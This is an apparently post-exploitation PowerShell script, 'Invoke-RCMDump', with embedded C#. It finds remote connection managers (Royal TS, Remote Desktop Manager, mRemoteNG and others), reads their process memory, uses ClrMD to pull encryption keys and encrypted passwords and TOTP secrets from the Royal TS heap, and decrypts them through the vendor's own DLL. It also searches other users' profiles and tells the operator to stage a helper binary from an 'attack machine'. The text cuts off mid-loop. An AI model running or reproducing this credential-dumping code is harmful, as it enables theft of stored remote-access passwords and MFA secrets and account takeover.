<#
.SYNOPSIS
    Recon, dump and decrypt credentials from .NET connection managers
    (RDM, Royal TS, mRemoteNG, etc.)

.PARAMETER Mode
    - recon   : identify installed/running connection managers and their data files
    - dump    : ClrMD heap scan to extract cleartext passwords from memory
    - offline : decrypt passwords directly from RDM's Connections.db (no process needed)
    - strings : brute-force UTF-16 string extraction from a memory dump (fallback)

.PARAMETER ProcessName
    Target process name (dump/strings modes). Default: auto-detect.

.PARAMETER Pid
    Target process ID (overrides ProcessName).

.PARAMETER DbPath
    Path to Connections.db (offline mode). Default: auto-detect.

.EXAMPLE
    .\Invoke-RCMDump.ps1 -Mode recon
    .\Invoke-RCMDump.ps1 -Mode dump
    .\Invoke-RCMDump.ps1 -Mode dump -ProcessName RemoteDesktopManager
    .\Invoke-RCMDump.ps1 -Mode offline
    .\Invoke-RCMDump.ps1 -Mode offline -DbPath C:\path\to\Connections.db
#>

param(
    [ValidateSet('recon', 'dump', 'offline', 'strings')]
    [string]$Mode = 'recon',
    [string]$ProcessName,
    [int]$TargetPid,
    [string]$DbPath,
    [string]$RtszPath,
    [string]$DocumentPassword = ''
)

# ───────────────────────────────────────────
#  Known targets
# ───────────────────────────────────────────

$targets = @(
    @{
        Name     = 'Remote Desktop Manager'
        Vendor   = 'Devolutions'
        Procs    = @('RemoteDesktopManager', 'RemoteDesktopManager64')
        Paths    = @(
            "$env:ProgramFiles\Devolutions\Remote Desktop Manager\RemoteDesktopManager.exe",
            "${env:ProgramFiles(x86)}\Devolutions\Remote Desktop Manager\RemoteDesktopManager.exe"
        )
        DataFiles = @(
            @{ Desc = 'Connections.db (SQLite)'; Path = "$env:LOCALAPPDATA\Devolutions\RemoteDesktopManager\Connections.db" },
            @{ Desc = 'Connections.db (Portable)'; Path = '.\Connections.db' }
        )
        RegKeys  = @('HKLM:\SOFTWARE\Devolutions', 'HKCU:\SOFTWARE\Devolutions')
        Crypto   = 'TripleDES-ECB, hardcoded GUID keys per connection type'
        OfflineSupport = $true
    },
    @{
        Name     = 'Royal TS'
        Vendor   = 'Royal Apps'
        Procs    = @('RoyalTS')
        Paths    = @(
            "$env:ProgramFiles\Royal TS V5\RoyalTS.exe",
            "$env:ProgramFiles\Royal TS V6\RoyalTS.exe",
            "$env:ProgramFiles\Royal TS V7\RoyalTS.exe",
            "$env:ProgramFiles\Royal TS V8\RoyalTS.exe",
            "${env:ProgramFiles(x86)}\Royal TS V5\RoyalTS.exe",
            "${env:ProgramFiles(x86)}\Royal TS V6\RoyalTS.exe",
            "${env:ProgramFiles(x86)}\Royal TS V7\RoyalTS.exe"
        )
        DataFiles = @(
            @{ Desc = 'Document files (.rtsz)'; Path = "$env:USERPROFILE\Documents\*.rtsz" },
            @{ Desc = 'Document files (.rtsz)'; Path = "$env:USERPROFILE\Desktop\*.rtsz" },
            @{ Desc = 'Document files (.rtsz)'; Path = "$env:USERPROFILE\Downloads\*.rtsz" }
        )
        RegKeys  = @('HKLM:\SOFTWARE\Royal Apps', 'HKCU:\SOFTWARE\Royal Apps')
        Crypto   = 'Rebex AES (new) / Rijndael-CBC PBKDF2 (legacy), hardcoded keys'
        OfflineSupport = $true
    },
    @{
        Name     = 'mRemoteNG'
        Vendor   = 'mRemoteNG'
        Procs    = @('mRemoteNG')
        Paths    = @(
            "$env:ProgramFiles\mRemoteNG\mRemoteNG.exe",
            "${env:ProgramFiles(x86)}\mRemoteNG\mRemoteNG.exe"
        )
        DataFiles = @(
            @{ Desc = 'confCons.xml'; Path = "$env:APPDATA\mRemoteNG\confCons.xml" }
        )
        RegKeys  = @()
        Crypto   = 'AES-128-CBC, default password "mR3m" or user master password'
        OfflineSupport = $false
    },
    @{
        Name     = 'MobaXterm'
        Vendor   = 'Mobatek'
        Procs    = @('MobaXterm')
        Paths    = @(
            "$env:ProgramFiles\Mobatek\MobaXterm\MobaXterm.exe",
            "${env:ProgramFiles(x86)}\Mobatek\MobaXterm\MobaXterm.exe"
        )
        DataFiles = @(
            @{ Desc = 'MobaXterm.ini'; Path = "$env:APPDATA\MobaXterm\MobaXterm.ini" },
            @{ Desc = 'Registry credentials'; Path = 'HKCU:\SOFTWARE\Mobatek\MobaXterm' }
        )
        RegKeys  = @('HKCU:\SOFTWARE\Mobatek\MobaXterm')
        Crypto   = 'Custom XOR + DPAPI or master password'
        OfflineSupport = $false
    },
    @{
        Name     = 'SuperPuTTY'
        Vendor   = 'SuperPuTTY'
        Procs    = @('SuperPuTTY')
        Paths    = @()
        DataFiles = @(
            @{ Desc = 'Sessions.xml'; Path = "$env:LOCALAPPDATA\SuperPuTTY\Sessions.xml" }
        )
        RegKeys  = @()
        Crypto   = 'Cleartext XML'
        OfflineSupport = $false
    },
    @{
        Name     = 'SecureCRT'
        Vendor   = 'VanDyke Software'
        Procs    = @('SecureCRT')
        Paths    = @(
            "$env:ProgramFiles\VanDyke Software\SecureCRT\SecureCRT.exe"
        )
        DataFiles = @(
            @{ Desc = 'Session configs'; Path = "$env:APPDATA\VanDyke\Config\Sessions\*" }
        )
        RegKeys  = @('HKCU:\SOFTWARE\VanDyke\SecureCRT')
        Crypto   = 'Blowfish-CBC, key derived from config passphrase'
        OfflineSupport = $false
    },
    @{
        Name     = 'Xshell'
        Vendor   = 'NetSarang'
        Procs    = @('Xshell')
        Paths    = @(
            "$env:ProgramFiles\NetSarang\Xshell\Xshell.exe",
            "${env:ProgramFiles(x86)}\NetSarang\Xshell\Xshell.exe"
        )
        DataFiles = @(
            @{ Desc = 'Session files (.xsh)'; Path = "$env:APPDATA\NetSarang Computer\7\Xshell\Sessions\*.xsh" }
        )
        RegKeys  = @('HKCU:\SOFTWARE\NetSarang')
        Crypto   = 'Custom + master password or DPAPI'
        OfflineSupport = $false
    },
    @{
        Name     = 'Remmina'
        Vendor   = 'Remmina'
        Procs    = @('remmina')
        Paths    = @()
        DataFiles = @(
            @{ Desc = 'Remmina configs (WSL)'; Path = '\\wsl$\*\home\*\.local\share\remmina\*.remmina' }
        )
        RegKeys  = @()
        Crypto   = 'libsecret / 3DES with machine-derived key'
        OfflineSupport = $false
    }
)

$knownProcesses = $targets | ForEach-Object { $_.Procs } | ForEach-Object { $_ }

$banner = @"

  ___  ___ __  __ ___
 | _ \/ __|  \/  |   \ _  _ _ __  _ __
 |   / (__| |\/| | |) | || | '  \| '_ \
 |_|_\\___|_|  |_|___/ \_,_|_|_|_| .__/
                                  |_|
  Remote Connection Manager Credential Extractor
  Mode: $Mode

"@

Write-Host $banner -ForegroundColor Cyan

# ─── Detect .NET SDK (optional — not needed if HeapDumper.exe is present) ───
$dotnetTfm = $null
if ($Mode -in 'dump','offline') {
    try {
        $sdkList = & dotnet --list-sdks 2>$null
        if ($sdkList) {
            foreach ($line in $sdkList) {
                if ($line -match '^(\d+)\.') {
                    $major = [int]$Matches[1]
                    $candidate = "net$major.0"
                    if (-not $dotnetTfm -or $major -gt [int]($dotnetTfm -replace 'net|\.0','')) { $dotnetTfm = $candidate }
                }
            }
        }
    } catch {}
    if ($dotnetTfm) {
        Write-Host "[*] .NET SDK: $dotnetTfm" -ForegroundColor DarkGray
    }
}

# ═══════════════════════════════════════════
#  MODE: RECON
# ═══════════════════════════════════════════

if ($Mode -eq 'recon') {

    Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
public class RCMWinApi {
    public delegate bool EnumWinProc(IntPtr hWnd, IntPtr lParam);
    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumWinProc cb, IntPtr lParam);
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder sb, int max);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
    public static List<string> GetTitles(uint pid) {
        var r = new List<string>();
        EnumWindows((h, _) => { uint p; GetWindowThreadProcessId(h, out p);
            if (p == pid) { var s = new StringBuilder(512); GetWindowText(h, s, 512); if (s.Length > 0) r.Add(s.ToString()); }
            return true; }, IntPtr.Zero);
        return r;
    }

    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int size, out int read);
    [DllImport("kernel32.dll")] static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MBI mbi, int len);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [StructLayout(LayoutKind.Sequential)]
    public struct MBI { public IntPtr BaseAddress, AllocationBase; public uint AllocationProtect; public IntPtr RegionSize; public uint State, Protect, Type; }

    public static List<string> ScanOpenDocs(int pid, string ext) {
        var results = new HashSet<string>();
        IntPtr h = OpenProcess(0x001F0FFF, false, pid);
        if (h == IntPtr.Zero) return new List<string>(results);
        byte[] needle = Encoding.Unicode.GetBytes(ext);
        IntPtr addr = IntPtr.Zero;
        MBI mbi;
        int mbiSize = Marshal.SizeOf(typeof(MBI));
        while (VirtualQueryEx(h, addr, out mbi, mbiSize) > 0) {
            long regionSize = (long)mbi.RegionSize;
            if (mbi.State == 0x1000 && regionSize > 0 && regionSize < 50000000) {
                byte[] buf = new byte[regionSize];
                int read;
                if (ReadProcessMemory(h, mbi.BaseAddress, buf, buf.Length, out read) && read > needle.Length) {
                    for (int i = 0; i <= read - needle.Length; i++) {
                        bool match = true;
                        for (int j = 0; j < needle.Length; j++) { if (buf[i + j] != needle[j]) { match = false; break; } }
                        if (!match) continue;
                        int start = i;
                        while (start > 1) { char c = (char)(buf[start - 2] | (buf[start - 1] << 8)); if (c < 0x20 || c > 0x7E) break; start -= 2; }
                        int end = i + needle.Length;
                        string s = Encoding.Unicode.GetString(buf, start, end - start).Trim();
                        if (s.Length > 260 || s.Contains("*") || s.Contains("{") || s.Contains("|") || s.Contains("<")) continue;
                        if (Regex.IsMatch(s, @"^[A-Za-z]:\\.*" + Regex.Escape(ext) + "$") || s.StartsWith("\\\\"))
                            results.Add(s);
                    }
                }
            }
            long next = (long)mbi.BaseAddress + regionSize;
            if (next <= (long)addr) break;
            addr = new IntPtr(next);
        }
        CloseHandle(h);
        return new List<string>(results);
    }
}
"@

    Write-Host "============================================" -ForegroundColor Yellow
    Write-Host "  RECONNAISSANCE" -ForegroundColor Yellow
    Write-Host "============================================`n" -ForegroundColor Yellow

    # Grab all processes once via WMI (sees every user, not just current)
    $allProcs = Get-CimInstance Win32_Process -Property Name, ProcessId, ExecutablePath, WorkingSetSize -ErrorAction SilentlyContinue

    $found = 0

    foreach ($t in $targets) {
        $installed = $false
        $running   = $false
        $dataFound = @()
        $exePath   = $null
        $runProcs  = @()

        # Check running processes (all users)
        foreach ($pn in $t.Procs) {
            $matched = @($allProcs | Where-Object { $_.Name -eq "$pn.exe" })
            if ($matched.Count -gt 0) {
                $running = $true
                $installed = $true
                $runProcs += $matched
                if (-not $exePath -and $matched[0].ExecutablePath) {
                    $exePath = $matched[0].ExecutablePath
                }
            }
        }

        # Check installation paths
        if (-not $installed) {
            foreach ($path in $t.Paths) {
                if (Test-Path $path) {
                    $installed = $true
                    $exePath = $path
                    break
                }
            }
        }

        # Check registry
        if (-not $installed) {
            foreach ($rk in $t.RegKeys) {
                if (Test-Path $rk) {
                    $installed = $true
                    break
                }
            }
        }

        if (-not $installed) { continue }
        $found++

        $status = if ($running) { "[RUNNING]" } else { "[INSTALLED]" }
        $color  = if ($running) { "Red" } else { "DarkYellow" }
        Write-Host "  $status $($t.Name) ($($t.Vendor))" -ForegroundColor $color

        if ($exePath) {
            $ver = $null
            try { $ver = (Get-Item $exePath).VersionInfo.ProductVersion } catch {}
            if ($ver) { Write-Host "          Version : $ver" -ForegroundColor DarkGray }
            Write-Host "          Path    : $exePath" -ForegroundColor DarkGray
        }

        if ($running) {
            foreach ($rp in $runProcs) {
                $owner = "?"
                try {
                    $ownerInfo = Invoke-CimMethod -InputObject $rp -MethodName GetOwner -ErrorAction SilentlyContinue
                    if ($ownerInfo.User) { $owner = "$($ownerInfo.Domain)\$($ownerInfo.User)" }
                } catch {}
                $mem = [math]::Round($rp.WorkingSetSize / 1MB)
                Write-Host "          PID     : $($rp.ProcessId)  (${mem}MB, $owner)" -ForegroundColor DarkGray
            }

            # Detect open documents via window titles + memory scan for full paths
            $docNames = @()
            foreach ($rp in $runProcs) {
                try {
                    $titles = [RCMWinApi]::GetTitles([uint32]$rp.ProcessId)
                    foreach ($title in $titles) {
                        if ($title -match '^(.+?)\s*-\s*Royal TS$')              { $docNames += $Matches[1] }
                        elseif ($title -match '^(.+?)\s*-\s*Remote Desktop Manager') { $docNames += $Matches[1] }
                        elseif ($title -match '^(.+?)\s*-\s*mRemoteNG')          { $docNames += $Matches[1] }
                    }
                } catch {}
            }

            # Memory scan: find full file paths for open documents
            $docExt = switch -Wildcard ($t.Procs[0]) {
                'RoyalTS*' { '.rtsz' }
                'RemoteDesktop*' { '.db' }
                'mRemoteNG*' { '.xml' }
                default { $null }
            }
            $memPaths = @()
            if ($docExt) {
                foreach ($rp in $runProcs) {
                    try { $memPaths += [RCMWinApi]::ScanOpenDocs([int]$rp.ProcessId, $docExt) } catch {}
                }
            }

            foreach ($dn in ($docNames | Select-Object -Unique)) {
                $fullPath = $memPaths | Where-Object { $_ -like "*\$dn$docExt" -or $_ -like "*\$dn.*" } | Select-Object -First 1
                if ($fullPath) {
                    Write-Host "          Doc     : $fullPath" -ForegroundColor Magenta
                } else {
                    Write-Host "          Doc     : $dn (open, path unknown)" -ForegroundColor Magenta
                }
            }
            # Show any extra paths from memory not matched by window titles
            foreach ($mp in ($memPaths | Select-Object -Unique)) {
                $fn = [System.IO.Path]::GetFileNameWithoutExtension($mp)
                if ($fn -notin $docNames) {
                    Write-Host "          Doc     : $mp (from memory)" -ForegroundColor Magenta
                }
            }

            # Fallback: scan Royal TS config files for recently opened documents (works over WinRM)
            if ($docNames.Count -eq 0 -and $memPaths.Count -eq 0 -and $t.Procs[0] -eq 'RoyalTS') {
                $configDirs = @()
                foreach ($rp in $runProcs) {
                    try {
                        $oi = Invoke-CimMethod -InputObject $rp -MethodName GetOwner -ErrorAction SilentlyContinue
                        if ($oi.User) {
                            $configDirs += "C:\Users\$($oi.User)\AppData\Roaming\code4ward\Settings\Documents"
                            $configDirs += "C:\Users\$($oi.User)\AppData\Local\Royal TS"
                        }
                    } catch {}
                }
                $configDirs += "$env:APPDATA\code4ward\Settings\Documents"
                $configDirs += "$env:LOCALAPPDATA\Royal TS"
                foreach ($cd in ($configDirs | Select-Object -Unique)) {
                    if (-not (Test-Path $cd)) { continue }
                    Get-ChildItem $cd -Filter "*.json" -ErrorAction SilentlyContinue | ForEach-Object {
                        try {
                            $json = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json -ErrorAction SilentlyContinue
                            if ($json.ConnectionsToRestore) {
                                foreach ($conn in $json.ConnectionsToRestore) {
                                    if ($conn -and $conn -match '\.rtsz') {
                                        Write-Host "          Doc     : $conn (from config)" -ForegroundColor Magenta
                                    }
                                }
                            }
                        } catch {}
                    }
                    Get-ChildItem $cd -Filter "*.rtsz" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                        Write-Host "          Doc     : $($_.FullName) (from config dir)" -ForegroundColor Magenta
                    }
                }
                # Also scan command line of the process for .rtsz paths
                foreach ($rp in $runProcs) {
                    try {
                        $cmdLine = $rp.CommandLine
                        if ($cmdLine) {
                            $rtszMatches = [regex]::Matches($cmdLine, '(?:[A-Za-z]:\\|\\\\)[^\s"]+\.rtsz')
                            foreach ($rm in $rtszMatches) {
                                Write-Host "          Doc     : $($rm.Value) (from cmdline)" -ForegroundColor Magenta
                            }
                        }
                    } catch {}
                }
            }
        }

        # Check data files (current user paths)
        foreach ($df in $t.DataFiles) {
            $matches = @()
            if ($df.Path -like 'HKCU:*' -or $df.Path -like 'HKLM:*') {
                if (Test-Path $df.Path) { $matches += $df.Path }
            } else {
                $matches = @(Resolve-Path $df.Path -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path)
            }
            foreach ($m in $matches) {
                $sz = ""
                if (Test-Path $m -PathType Leaf) {
                    $sz = " ($([math]::Round((Get-Item $m).Length / 1KB))KB)"
                }
                Write-Host "          Data    : $($df.Desc) -> $m$sz" -ForegroundColor DarkGray
                $dataFound += $m
            }
        }

        # If running, also scan process owner's profile (useful over WinRM where $env:USERPROFILE != process owner)
        if ($running) {
            $ownerProfiles = @()
            foreach ($rp in $runProcs) {
                try {
                    $oi = Invoke-CimMethod -InputObject $rp -MethodName GetOwner -ErrorAction SilentlyContinue
                    if ($oi.User) {
                        $profPath = "C:\Users\$($oi.User)"
                        if ((Test-Path $profPath) -and $profPath -ne $env:USERPROFILE -and $ownerProfiles -notcontains $profPath) {
                            $ownerProfiles += $profPath
                        }
                    }
                } catch {}
            }
            foreach ($prof in $ownerProfiles) {
                $searchPaths = @("$prof\Documents\*.rtsz", "$prof\Desktop\*.rtsz", "$prof\Downloads\*.rtsz",
                                 "$prof\AppData\Local\Devolutions\RemoteDesktopManager\Connections.db",
                                 "$prof\AppData\Roaming\mRemoteNG\confCons.xml")
                foreach ($sp in $searchPaths) {
                    $found2 = @(Resolve-Path $sp -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path)
                    foreach ($f in $found2) {
                        if ($f -notin $dataFound) {
                            $sz = ""
                            if (Test-Path $f -PathType Leaf) { $sz = " ($([math]::Round((Get-Item $f).Length / 1KB))KB)" }
                            Write-Host "          Data    : $f$sz (owner profile)" -ForegroundColor Magenta
                            $dataFound += $f
                        }
                    }
                }
            }
        }

        Write-Host "          Crypto  : $($t.Crypto)" -ForegroundColor DarkGray
        if ($t.OfflineSupport) {
            Write-Host "          Offline : SUPPORTED (use -Mode offline)" -ForegroundColor Green
        }

        Write-Host ""
    }

    # Summary
    Write-Host "============================================" -ForegroundColor Yellow
    if ($found -eq 0) {
        Write-Host "  No connection managers detected." -ForegroundColor DarkYellow
    } else {
        Write-Host "  $found connection manager(s) detected." -ForegroundColor Green
        Write-Host ""
        Write-Host "  Next steps:" -ForegroundColor Cyan
        $runningTargets = $targets | Where-Object {
            $_.Procs | ForEach-Object { $pn = $_; $allProcs | Where-Object { $_.Name -eq "$pn.exe" } } | Where-Object { $_ }
        }
        if ($runningTargets) {
            Write-Host "    -Mode dump     : extract creds from memory (process running)" -ForegroundColor White
        }
        $rdmDb = "$env:LOCALAPPDATA\Devolutions\RemoteDesktopManager\Connections.db"
        if (Test-Path $rdmDb) {
            Write-Host "    -Mode offline  : decrypt RDM Connections.db (no process needed)" -ForegroundColor White
        }
        Write-Host "    -Mode strings  : brute-force strings from memory dump (fallback)" -ForegroundColor White
    }
    Write-Host "============================================`n" -ForegroundColor Yellow

    exit 0
}


# ═══════════════════════════════════════════
#  MODE: DUMP (ClrMD)
# ═══════════════════════════════════════════

if ($Mode -eq 'dump') {

    # --- Find target process ---
    $proc = $null
    if ($TargetPid -gt 0) {
        $proc = Get-Process -Id $TargetPid -ErrorAction SilentlyContinue
        if (-not $proc) { Write-Error "[-] PID $TargetPid not found"; exit 1 }
    } elseif ($ProcessName) {
        $proc = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $proc) { Write-Error "[-] Process '$ProcessName' not found"; exit 1 }
    } else {
        Write-Host "[*] Scanning for running connection managers..." -ForegroundColor Cyan
        foreach ($name in $knownProcesses) {
            $proc = Get-Process -Name $name -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($proc) { break }
        }
        if (-not $proc) { Write-Error "[-] No known connection manager running. Use -ProcessName or -Pid."; exit 1 }
    }

    Write-Host "[+] Target: $($proc.ProcessName) (PID: $($proc.Id), $([math]::Round($proc.WorkingSet64/1MB))MB)" -ForegroundColor Green

    # Detect Royal TS install dir for SecurityInterface decryption
    $rtInstallDir = $null
    try {
        $rtInstallDir = Split-Path $proc.MainModule.FileName
    } catch {}
    if (-not $rtInstallDir -or -not (Test-Path "$rtInstallDir\RoyalDocument.SecurityInterface.dll")) {
        $rtInstallDir = @(
            "$env:ProgramFiles\Royal TS V5",
            "$env:ProgramFiles\Royal TS V6",
            "$env:ProgramFiles\Royal TS V7",
            "$env:ProgramFiles\Royal TS V8",
            "${env:ProgramFiles(x86)}\Royal TS V5",
            "${env:ProgramFiles(x86)}\Royal TS V6",
            "${env:ProgramFiles(x86)}\Royal TS V7"
        ) | Where-Object { Test-Path "$_\RoyalDocument.SecurityInterface.dll" } | Select-Object -First 1
    }
    if (-not $rtInstallDir) { $rtInstallDir = "." }
    Write-Host "[*] Royal TS dir: $rtInstallDir" -ForegroundColor DarkGray

    # --- Find scanner binary ---
    # Priority 1: Pre-built HeapDumper.exe next to script (for targets without .NET SDK)
    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
    $prebuiltExe = Join-Path $scriptDir "HeapDumper.exe"
    $scannerCmd = $null

    if (Test-Path $prebuiltExe) {
        Write-Host "[*] Using pre-built scanner: $prebuiltExe" -ForegroundColor DarkGray
        $scannerCmd = "& `"$prebuiltExe`" $($proc.Id) `"$rtInstallDir`""
    } else {
        # Priority 2: dotnet SDK build
        if (-not $dotnetTfm) {
            Write-Host "[!] No .NET SDK found and no HeapDumper.exe next to script." -ForegroundColor Red
            Write-Host "[!] Build HeapDumper.exe on your attack machine:" -ForegroundColor Red
            Write-Host "      cd HeapDumper && dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true" -ForegroundColor Yellow
            Write-Host "[!] Then upload HeapDumper.exe next to Invoke-RCMDump.ps1" -ForegroundColor Red
            exit 1
        }
        $projectDir = Join-Path $env:TEMP "RCMDump_ClrMD"
        $csprojPath = Join-Path $projectDir "HeapDumper.csproj"
        $hashFile = Join-Path $projectDir ".cs_hash"
    }

    $csCode = @'
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Diagnostics.Runtime;

class Program
{
    static Dictionary<string, string> ReadKvStore(ClrObject obj)
    {
        var kv = new Dictionary<string, string>();
        try {
            var kvStore = obj.ReadObjectField("_keyValueStore");
            if (!kvStore.IsValid || kvStore.Type == null) return kv;
            var entries = kvStore.ReadObjectField("_entries");
            if (!entries.IsValid || entries.Type == null || !entries.Type.IsArray) return kv;
            var arr = entries.AsArray();
            for (int i = 0; i < arr.Length; i++)
            {
                try {
                    var sv = arr.GetStructValue(i);
                    var ko = sv.ReadObjectField("key");
                    var vo = sv.ReadObjectField("value");
                    if (ko.IsValid && ko.AsString() != null)
                        kv[ko.AsString()!] = vo.IsValid ? (vo.AsString() ?? "") : "";
                } catch {}
            }
        } catch {}
        return kv;
    }

    static void Main(string[] args)
    {
        if (args.Length < 2) { Console.WriteLine("Usage: HeapDumper <PID> <RoyalTSInstallDir>"); return; }
        int pid = int.Parse(args[0]);
        string rtDir = args[1];

        Console.WriteLine($"[*] Attaching to PID {pid}...");
        using var target = DataTarget.AttachToProcess(pid, false);

        foreach (var clrInfo in target.ClrVersions)
        {
            Console.WriteLine($"[*] CLR {clrInfo.Version}");
            ClrRuntime runtime;
            try {
                runtime = clrInfo.CreateRuntime();
            } catch {
                var clrPath = clrInfo.ModuleInfo.FileName;
                if (!string.IsNullOrEmpty(clrPath)) {
                    var dacPath = Path.Combine(Path.GetDirectoryName(clrPath)!, "mscordaccore.dll");
                    Console.WriteLine($"[*] Symbol server failed, using local DAC: {dacPath}");
                    runtime = clrInfo.CreateRuntime(dacPath);
                } else { throw; }
            }
            var heap = runtime.Heap;
            Console.WriteLine($"[*] Scanning heap...");

            // Phase 1: Extract SecurityInterface keys + Zxcvbn passwords as doc password candidates
            string siKey1 = "", siKey2 = "", siDoc = "";
            var docPwdCandidates = new List<string> { "" };

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn1 = obj.Type.Name ?? "";

                if (tn1 == "RoyalDocumentLibrary.RoyalSecurityInterface")
                {
                    try {
                        var f1 = obj.ReadStringField("smhos"); if (!string.IsNullOrEmpty(f1)) siKey1 = f1;
                    } catch {}
                    try {
                        var f2 = obj.ReadStringField("smhot"); if (!string.IsNullOrEmpty(f2)) siKey2 = f2;
                    } catch {}
                    try {
                        var f3 = obj.ReadStringField("smhou"); if (!string.IsNullOrEmpty(f3)) siDoc = f3;
                    } catch {}
                    continue;
                }

                // Collect Zxcvbn passwords as document password candidates
                if (tn1 == "Zxcvbn.Result")
                {
                    foreach (var f in obj.Type.Fields)
                    {
                        try {
                            if (f.ElementType == ClrElementType.String)
                            {
                                var fn = (f.Name ?? "").TrimStart('_', '<').Replace(">k__BackingField", "").ToLowerInvariant();
                                if (fn.Contains("password"))
                                {
                                    var val = obj.ReadStringField(f.Name);
                                    if (!string.IsNullOrEmpty(val) && val.Length >= 1 && val.Length <= 100 && !docPwdCandidates.Contains(val))
                                        docPwdCandidates.Add(val);
                                }
                            }
                        } catch {}
                    }
                    continue;
                }
            }

            if (string.IsNullOrEmpty(siKey1))
            {
                Console.WriteLine("[!] No SecurityInterface keys found on heap");
                Console.WriteLine("\n##RESULTS_START##\n##RESULTS_END##");
                return;
            }
            Console.WriteLine($"[*] SecurityInterface keys extracted (key1={siKey1.Length}c, key2={siKey2.Length}c, doc={siDoc})");
            Console.WriteLine($"[*] Found {docPwdCandidates.Count} document password candidate(s)");

            // Phase 2: Collect entries with encrypted values from _keyValueStore
            var entries = new List<(string type, string name, string host, string user, string encPwd, string encTotp, string otpAlgo, string otpDigits, string otpPeriod, string otpLabel, string docName)>();

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn = obj.Type.Name ?? "";
                if (!tn.StartsWith("RoyalDocumentLibrary.Royal")) continue;
                if (!(tn.Contains("Credential") || tn.Contains("Connection")) || tn.EndsWith("[]")) continue;

                var kv = ReadKvStore(obj);
                string encPwd = ""; kv.TryGetValue("Password", out encPwd); encPwd ??= "";
                if (string.IsNullOrEmpty(encPwd)) continue;

                string name = "", host = "", user = "";
                kv.TryGetValue("Name", out name); name ??= "";
                kv.TryGetValue("UserName", out user); user ??= "";
                if (string.IsNullOrEmpty(user)) { kv.TryGetValue("CredentialUsername", out user); user ??= ""; }
                kv.TryGetValue("ComputerName", out host); host ??= "";
                if (string.IsNullOrEmpty(host)) { kv.TryGetValue("URI", out host); host ??= ""; }

                string encTotp = ""; kv.TryGetValue("MfaTotpSecret", out encTotp); encTotp ??= "";
                string mfaCfg = ""; kv.TryGetValue("MfaConfiguration", out mfaCfg); mfaCfg ??= "0";
                string otpAlgo = "", otpDigits = "", otpPeriod = "", otpLabel = "";
                if (mfaCfg != "0" && mfaCfg != "") {
                    string raw = ""; kv.TryGetValue("MfaTotpGeneratorAlgorithm", out raw); raw ??= "0";
                    otpAlgo = raw switch { "0" => "SHA1", "1" => "SHA256", "2" => "SHA512", _ => raw };
                    kv.TryGetValue("MfaTotpGeneratorCodeLength", out otpDigits); otpDigits ??= "0";
                    if (otpDigits == "0") otpDigits = "6";
                    kv.TryGetValue("MfaTotpGeneratorSecondsValid", out otpPeriod); otpPeriod ??= "30";
                    kv.TryGetValue("MfaTotpGeneratorLabel", out otpLabel); otpLabel ??= "";
                }

                // Get document name
                string docName = "";
                try {
                    var doc = obj.ReadObjectField("_royalDocument");
                    if (doc.IsValid && doc.Type != null) {
                        var dkv = ReadKvStore(doc);
                        dkv.TryGetValue("Name", out docName); docName ??= "";
                    }
                } catch {}

                entries.Add((tn.Replace("RoyalDocumentLibrary.", ""), name, host, user, encPwd, encTotp, otpAlgo, otpDigits, otpPeriod, otpLabel, docName));
            }

            var unique = entries.GroupBy(e => $"{e.name}|{e.user}").Select(g => g.First()).ToList();
            Console.WriteLine($"[*] Found {unique.Count} entry(ies) with encrypted passwords");

            // Phase 3: Load SecurityInterface DLL and decrypt
            AppDomain.CurrentDomain.AssemblyResolve += (s, e) => {
                var p = Path.Combine(rtDir, new AssemblyName(e.Name).Name + ".dll");
                return File.Exists(p) ? Assembly.LoadFrom(p) : null;
            };

            object? siInst = null;
            MethodInfo? decMethod = null;
            try {
                var siAsm = Assembly.LoadFrom(Path.Combine(rtDir, "RoyalDocument.SecurityInterface.dll"));
                var siType = siAsm.GetType("RoyalDocumentLibrary.RoyalSecurityInterface")!;
                siInst = Activator.CreateInstance(siType);
                siType.GetField("smhos", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance)!.SetValue(siInst, siKey1);
                siType.GetField("smhot", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance)!.SetValue(siInst, siKey2);
                siType.GetField("smhou", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance)!.SetValue(siInst, siDoc);
                decMethod = siType.GetMethod("Decrypt", new[] { typeof(string), typeof(bool), typeof(string) });
                Console.WriteLine("[*] SecurityInterface loaded, decrypting...");
            } catch (Exception ex) {
                Console.WriteLine($"[!] Failed to load SecurityInterface: {ex.Message}");
            }

            // Add entry names/usernames as extra doc password candidates
            foreach (var x in unique) {
                if (!string.IsNullOrEmpty(x.name) && !docPwdCandidates.Contains(x.name)) docPwdCandidates.Add(x.name);
                if (!string.IsNullOrEmpty(x.user) && !docPwdCandidates.Contains(x.user)) docPwdCandidates.Add(x.user);
                if (!string.IsNullOrEmpty(x.docName) && !docPwdCandidates.Contains(x.docName)) docPwdCandidates.Add(x.docName);
            }

            Console.WriteLine("\n##RESULTS_START##");

            var knownDocPwd = new Dictionary<string, string>();

            foreach (var e in unique)
            {
                string plainPwd = "", plainTotp = "", usedDp = "";
                if (decMethod != null && siInst != null)
                {
                    // Check if we already know the doc password for this document
                    string cachedDp = "";
